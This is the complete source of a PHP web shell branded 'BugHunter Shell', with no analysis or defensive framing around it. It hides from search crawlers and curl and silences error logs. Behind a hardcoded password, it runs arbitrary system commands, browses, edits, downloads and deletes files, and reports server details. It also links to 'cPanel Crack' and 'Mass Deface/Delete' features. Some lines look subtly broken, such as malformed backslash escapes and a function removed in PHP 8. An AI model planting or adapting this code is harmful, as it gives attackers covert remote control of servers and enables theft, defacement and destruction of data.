<?php
session_start();
@error_reporting(0);
@set_time_limit(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$password = "f15cdeafda022023d77e69706f691d2c"; // md5: bughunterv1
$SERVERIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']);
$FILEPATH = str_replace($_SERVER['DOCUMENT_ROOT'], "", getcwd());

// Anti-crawler protection
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = ["Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl"];
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

// Login Shell
function login_shell() {
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <title>BugHunter Shell</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #1a202c; color: #e2e8f0; }
        .ascii-art { font-family: monospace; white-space: pre; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="text-center">
        <div class="ascii-art text-green-500 mb-4">
            ___________________________
            < root:~# >
            ---------------------------
        d8888b. db    db  d888b  db   db db    db d8b   db d888888b d88888b d8888b. 
        88  `8D 88    88 88' Y8b 88   88 88    88 888o  88 `~~88~~' 88'     88  `8D 
        88oooY' 88    88 88      88ooo88 88    88 88V8o 88    88    88ooooo 88oobY' 
        88~~~b. 88    88 88  ooo 88~~~88 88    88 88 V8o88    88    88~~~~~ 88`8b   
        88   8D 88b  d88 88. ~8~ 88   88 88b  d88 88  V888    88    88.     88 `88. 
        Y8888P' ~Y8888P'  Y888P  YP   YP ~Y8888P' VP   V8P    YP    Y88888P 88   YD
        </div>
        <form method="post" class="mt-4">
            <input type="password" name="password" class="border border-green-500 bg-transparent text-red-500 text-center p-2 rounded" placeholder="Enter Password">
            <button type="submit" class="mt-2 bg-green-500 text-black p-2 rounded hover:bg-green-600">Login</button>
        </form>
    </div>
</body>
</html>
<?php
    exit;
}

// Session Authentication
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (empty($password) || (isset($_POST['password']) && md5($_POST['password']) === $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}

// File Download
if (isset($_GET['file']) && $_GET['file'] != '' && $_GET['act'] == 'download') {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

// Strip slashes if magic quotes is enabled
if (get_magic_quotes_gpc()) {
    function idx_ss($array) {
        return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
}

// Utility Functions
function path() {
    return isset($_GET['dir']) ? str_replace("\", "/", $_GET['dir']) : str_replace("\", "/", getcwd());
}

function color($string, $color = 'text-white') {
    return "<span class='$color'>$string</span>";
}

function OS() {
    return strtoupper(substr(PHP_OS, 0, 3)) === "WIN" ? "Windows" : "Linux";
}

function exe($cmd) {
    $output = '';
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $output = @ob_get_clean();
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $output = implode("\n", $results);
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $output = @ob_get_clean();
    } elseif (function_exists('shell_exec')) {
        $output = @shell_exec($cmd);
    }
    return $output;
}

function save($filename, $mode, $content) {
    $handle = fopen($filename, $mode);
    fwrite($handle, $content);
    fclose($handle);
}

function hddsize($size) {
    if ($size >= 1073741824) return sprintf('%.2f', $size / 1073741824) . ' GB';
    if ($size >= 1048576) return sprintf('%.2f', $size / 1048576) . ' MB';
    if ($size >= 1024) return sprintf('%.2f', $size / 1024) . ' KB';
    return $size . ' B';
}

function hdd() {
    return (object) [
        'size' => hddsize(disk_total_space("/")),
        'free' => hddsize(disk_free_space("/")),
        'used' => hddsize(disk_total_space("/") - disk_free_space("/"))
    ];
}

function perms($path) {
    $perms = fileperms($path);
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function writeable($path, $perms) {
    return is_writable($path) ? color($perms, 'text-green-500') : color($perms, 'text-red-500');
}

// Main Interface
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BugHunter Shell</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #1a202c; color: #e2e8f0; font-family: 'Courier New', monospace; }
        .table-auto th, .table-auto td { border: 1px solid #4a5568; padding: 8px; }
        .table-auto th { background-color: #2d3748; color: #48bb78; }
        .table-auto tr:hover { background-color: #4a5568; }
        textarea, input[type="text"] { background: transparent; border: 1px solid #4a5568; color: #e2e8f0; }
        button, input[type="submit"] { background-color: #48bb78; color: #1a202c; }
        button:hover, input[type="submit"]:hover { background-color: #38a169; }
    </style>
    <script>
        function executeCommand() {
            const cmd = document.getElementById('cmdInput').value;
            fetch('?do=cmd&dir=<?php echo path(); ?>', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'cmd=' + encodeURIComponent(cmd)
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('cmdOutput').innerHTML = data;
            });
        }
    </script>
</head>
<body class="p-4">
    <div class="max-w-7xl mx-auto">
        <h1 class="text-2xl text-green-500 mb-4">BugHunter Shell</h1>
        <div class="mb-4">
            <p>SERVER IP: <?php echo color($SERVERIP, 'text-green-500'); ?> | YOUR IP: <?php echo color($_SERVER['REMOTE_ADDR'], 'text-green-500'); ?></p>
            <p>WEB SERVER: <?php echo color($_SERVER['SERVER_SOFTWARE'], 'text-green-500'); ?></p>
            <p>SYSTEM: <?php echo color(php_uname(), 'text-green-500'); ?></p>
            <p>HDD: <?php echo color(hdd()->used, 'text-green-500'); ?> / <?php echo color(hdd()->size, 'text-green-500'); ?> (Free: <?php echo color(hdd()->free, 'text-green-500'); ?>)</p>
            <p>PHP VERSION: <?php echo color(phpversion(), 'text-green-500'); ?></p>
            <p>Current Dir: <?php echo color(path(), 'text-green-500'); ?> [<?php echo writeable(path(), perms(path())); ?>]</p>
        </div>

        <div class="mb-4">
            <input id="cmdInput" type="text" class="w-full p-2 rounded" placeholder="Enter command...">
            <button onclick="executeCommand()" class="mt-2 p-2 rounded">Execute</button>
            <pre id="cmdOutput" class="mt-2 bg-gray-800 p-4 rounded"></pre>
        </div>

        <div class="mb-4">
            <ul class="flex space-x-4">
                <li><a href="?" class="text-white hover:text-yellow-500">Home</a></li>
                <li><a href="?dir=<?php echo path(); ?>&do=fakeroot" class="text-white hover:text-yellow-500">Fake Root</a></li>
                <li><a href="?dir=<?php echo path(); ?>&do=cpanel" class="text-white hover:text-yellow-500">cPanel Crack</a></li>
                <li><a href="?dir=<?php echo path(); ?>&do=mass" class="text-white hover:text-yellow-500">Mass Deface/Delete</a></li>
            </ul>
        </div>

        <table class="table-auto w-full">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Type</th>
                    <th>Size</th>
                    <th>Last Modified</th>
                    <th>Permissions</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $dir = scandir(path());
                foreach ($dir as $item) {
                    $itemPath = path() . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($itemPath)) {
                        $type = 'dir';
                        $size = '-';
                        $actions = ($item === '.' || $item === '..') 
                            ? "<a href='?act=newfile&dir=" . path() . "'>newfile</a> | <a href='?act=newfolder&dir=" . path() . "'>newfolder</a>"
                            : "<a href='?act=rename_folder&dir=$itemPath'>rename</a> | <a href='?act=delete_folder&dir=$itemPath'>delete</a>";
                    } else {
                        $type = 'file';
                        $size = round(filesize($itemPath) / 1024, 2) . ' KB';
                        $actions = "<a href='?act=edit&dir=" . path() . "&file=$itemPath'>edit</a> | <a href='?act=rename&dir=" . path() . "&file=$itemPath'>rename</a> | <a href='?act=download&dir=" . path() . "&file=$itemPath'>download</a> | <a href='?act=delete&dir=" . path() . "&file=$itemPath'>delete</a>";
                    }
                    $time = date("F d Y g:i:s", filemtime($itemPath));
                    $perms = writeable($itemPath, perms($itemPath));
                    $link = is_dir($itemPath) ? "<a href='?dir=$itemPath'>$item</a>" : "<a href='?act=view&dir=" . path() . "&file=$itemPath'>$item</a>";
                    ?>
                    <tr>
                        <td><?php echo $link; ?></td>
                        <td class="text-center"><?php echo $type; ?></td>
                        <td class="text-center"><?php echo $size; ?></td>
                        <td class="text-center"><?php echo $time; ?></td>
                        <td class="text-center"><?php echo $perms; ?></td>
                        <td class="text-center"><?php echo $actions; ?></td>
                    </tr>
                    <?php
                }
                ?>
            </tbody>
        </table>
    </div>
</body>
</html>
<?php
// File Actions
if (isset($_GET['act'])) {
    if ($_GET['act'] === 'edit' && isset($_POST['save'])) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        echo $save ? color("File Saved!", 'text-green-500') : color("Permission Denied!", 'text-red-500');
    }
    if ($_GET['act'] === 'newfile' && isset($_POST['save'])) {
        $filename = htmlspecialchars($_POST['filename']);
        $fopen = fopen($filename, "a+");
        echo $fopen ? "<script>window.location='?act=edit&dir=" . path() . "&file=$filename';</script>" : color("Permission Denied!", 'text-red-500');
    }
}
?>